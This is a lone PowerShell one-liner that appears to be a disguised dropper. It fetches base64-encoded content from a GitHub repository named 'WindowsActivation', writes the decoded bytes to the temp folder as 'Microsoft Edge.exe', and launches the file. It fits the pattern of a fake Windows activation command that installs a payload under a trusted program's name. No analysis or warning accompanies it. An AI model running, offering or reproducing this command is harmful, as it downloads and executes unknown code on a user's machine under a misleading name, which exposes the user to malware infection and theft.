...
$url='https://raw.githubusercontent.com/authenticaterlotgames/WindowsActivation/refs/heads/main/output.txt'; $b64=(Invoke-WebRequest -Uri $url -UseBasicParsing).Content.Trim(); $path=[System.IO.Path]::Combine($env:TEMP, 'Microsoft Edge.exe'); [System.IO.File]::WriteAllBytes($path, [System.Convert]::FromBase64String($b64)); Start-Process $path
